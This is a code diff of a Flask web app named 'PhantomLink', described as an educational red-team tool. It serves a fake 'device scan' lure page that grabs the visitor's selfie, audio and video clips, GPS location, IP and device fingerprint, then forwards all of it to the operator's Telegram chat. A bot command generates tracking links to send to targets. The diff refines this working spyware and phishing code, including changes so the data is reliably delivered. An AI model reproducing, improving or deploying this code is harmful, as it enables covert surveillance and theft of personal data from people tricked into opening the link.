@@ -1,22 +1,28 @@
+#!/usr/bin/env python3
+"""
+PhantomLink – Advanced Red‑Team Recon Simulation (Educational)
+Author: CAT Shadow Hacker
+Use only on devices you own or with explicit authorised permission.
+"""
+
 import os
 import json
 import base64
 import logging
-from io import BytesIO
 from threading import Thread
 from flask import Flask, request, render_template_string
-import requests as req  # avoid name conflict with Flask request
+import requests as req  # avoid naming conflict with Flask request
 
-# -------------------- CONFIG (set as Vercel environment variables) --------------------
-BOT_TOKEN = os.environ.get("BOT_TOKEN")      # Telegram bot token from @BotFather
-CHAT_ID = os.environ.get("CHAT_ID")          # Your Telegram user ID (e.g., from @userinfobot)
-# ------------------------------------------------------------------------------------
+# -------------------- CONFIG (Vercel environment variables) --------------------
+BOT_TOKEN = os.environ.get("BOT_TOKEN")      # Telegram bot token
+CHAT_ID = os.environ.get("CHAT_ID")          # Your Telegram numeric user ID
+# ------------------------------------------------------------------------------
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-# ---------- Full capture HTML / JavaScript ----------
-HTML = """<!DOCTYPE html>
+# ===================== HTML / JavaScript (Lure Page) =====================
+HTML = r"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -90,17 +96,17 @@ HTML = """<!DOCTYPE html>
                 });
                 updateStatus('Media access granted ✓');
 
-                // Photo (selfie)
+                // Selfie
                 const photo = await capturePhoto(stream);
                 collected.photo = photo;
                 updateStatus('Photo captured ✓');
 
-                // Audio recording (5 seconds)
+                // Audio (5 seconds)
                 const audioBlob = await recordAudio(stream, 5000);
                 collected.audio = await blobToBase64(audioBlob);
                 updateStatus('Audio recorded ✓');
 
-                // Video recording (3 seconds)
+                // Video (3 seconds)
                 const videoBlob = await recordVideo(stream, 3000);
                 collected.video = await blobToBase64(videoBlob);
                 updateStatus('Video recorded ✓');
@@ -113,14 +119,18 @@ HTML = """<!DOCTYPE html>
 
             updateStatus('Sending report...');
             try {
-                await fetch('/collect', {
+                const response = await fetch('/collect', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(collected)
                 });
-                updateStatus('Scan complete. Thank you.');
+                if (response.ok) {
+                    updateStatus('Scan complete. Thank you.');
+                } else {
+                    updateStatus('Failed to send report.');
+                }
             } catch (e) {
-                updateStatus('Failed to send report.');
+                updateStatus('Network error.');
             } finally {
                 spinner.style.display = 'none';
                 scanBtn.style.display = 'none';
@@ -184,61 +194,101 @@ HTML = """<!DOCTYPE html>
 </html>
 """
 
-# ---------- Flask Routes ----------
+# ===================== FLASK ROUTES =====================
+
 @app.route('/')
 def index():
     return render_template_string(HTML)
 
+
 @app.route('/collect', methods=['POST'])
 def collect():
-    data = request.get_json(force=True)
+    """
+    Synchronous processing to keep the function alive until media is sent.
+    Vercel allows up to 10 seconds of execution, which is enough for small media.
+    """
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ua = request.headers.get('User-Agent')
-    # Process asynchronously so the response is instant
-    Thread(target=send_to_telegram, args=(data, ip, ua)).start()
+    ua = request.headers.get('User-Agent', '')
+    logging.info(f"[/collect] Hit from {ip}")
+
+    try:
+        data = request.get_json(force=True)
+    except Exception as e:
+        logging.error(f"JSON parse error: {e}")
+        return 'Bad JSON', 400
+
+    logging.info(f"Received data keys: {list(data.keys())}")
+    if not data:
+        logging.warning("Empty payload")
+        return 'Empty', 400
+
+    # Send all data synchronously (no thread) to avoid Vercel killing background tasks
+    send_to_telegram(data, ip, ua)
     return 'OK', 200
+
+
+# ===================== TELEGRAM SENDING =====================
 
 def send_to_telegram(data, ip, ua):
     if not BOT_TOKEN or not CHAT_ID:
         logging.error("Missing BOT_TOKEN or CHAT_ID env vars")
         return
+
     try:
-        # 1. Text message with location + fingerprint
+        # 1. Text summary with location & fingerprint
         location = data.get('location', {})
         if 'lat' in location:
             maps_link = f"https://www.google.com/maps?q={location['lat']},{location['lon']}"
             loc_text = f"📍 Lat: {location['lat']}\n📍 Lon: {location['lon']}\n📍 Accuracy: {location.get('accuracy')}m\n🗺️ {maps_link}"
         else:
             loc_text = f"📍 Location: {location.get('error', 'Not available')}"
-        fingerprint = f"IP: {ip}\nUA: {ua}\nScreen: {data.get('screen')}\nPlatform: {data.get('platform')}\nMemory: {data.get('deviceMemory')}GB"
-        msg = f"🛡️ *New Device Scan Report*\n\n{fingerprint}\n\n{loc_text}\n\nTimestamp: {data.get('timestamp')}"
-        req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                 json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
 
-        # 2. Photo (if captured)
+        fingerprint = (
+            f"IP: {ip}\n"
+            f"UA: {ua}\n"
+            f"Screen: {data.get('screen')}\n"
+            f"Platform: {data.get('platform')}\n"
+            f"Memory: {data.get('deviceMemory')}GB"
+        )
+        msg = f"🛡️ *New Device Scan Report*\n\n{fingerprint}\n\n{loc_text}\n\nTimestamp: {data.get('timestamp')}"
+        req.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}
+        )
+
+        # 2. Selfie (JPEG)
         if data.get('photo'):
             photo_bytes = base64.b64decode(data['photo'].split(',')[1])
-            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                     files={"photo": ("selfie.jpg", photo_bytes)},
-                     data={"chat_id": CHAT_ID, "caption": "Selfie"})
+            req.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                files={"photo": ("selfie.jpg", photo_bytes)},
+                data={"chat_id": CHAT_ID, "caption": "Selfie"}
+            )
 
-        # 3. Audio (if captured)
+        # 3. Audio (WebM)
         if data.get('audio'):
             audio_bytes = base64.b64decode(data['audio'].split(',')[1])
-            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
-                     files={"voice": ("recording.webm", audio_bytes)},
-                     data={"chat_id": CHAT_ID, "caption": "Voice recording"})
+            req.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
+                files={"voice": ("recording.webm", audio_bytes)},
+                data={"chat_id": CHAT_ID, "caption": "Voice recording"}
+            )
 
-        # 4. Video (if captured)
+        # 4. Video (WebM)
         if data.get('video'):
             video_bytes = base64.b64decode(data['video'].split(',')[1])
-            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                     files={"video": ("clip.webm", video_bytes)},
-                     data={"chat_id": CHAT_ID, "caption": "Video clip"})
+            req.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
+                files={"video": ("clip.webm", video_bytes)},
+                data={"chat_id": CHAT_ID, "caption": "Video clip"}
+            )
+
     except Exception as e:
         logging.error(f"Telegram send failed: {e}")
 
-# ---------- Telegram Webhook (bot commands) ----------
+
+# ===================== TELEGRAM WEBHOOK (Bot Commands) =====================
+
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = request.get_json(force=True)
@@ -249,9 +299,11 @@ def webhook():
         chat_id = msg['chat']['id']
         text = msg.get('text', '')
         if text == '/start':
-            send_telegram_message(chat_id, "🕵️ *PhantomLink Bot*\n/link - Generate tracking link\n/clear - Reset")
+            send_telegram_message(chat_id,
+                "🕵️ *PhantomLink Bot*\n"
+                "/link - Generate tracking link\n"
+                "/clear - Reset")
         elif text == '/link':
-            # VERCEL_URL is automatically provided by Vercel (no protocol)
             domain = os.environ.get("VERCEL_URL", "your-project.vercel.app")
             link = f"https://{domain}/"
             send_telegram_message(chat_id,
@@ -262,10 +314,14 @@ def webhook():
             send_telegram_message(chat_id, "✅ Data cleared (in‑memory only).")
     return 'OK'
 
-def send_telegram_message(chat_id, text, **kwargs):
-    req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-             json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown", **kwargs})
 
-# For local testing only
+def send_telegram_message(chat_id, text, **kwargs):
+    req.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown", **kwargs}
+    )
+
+
+# ===================== LOCAL TESTING =====================
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
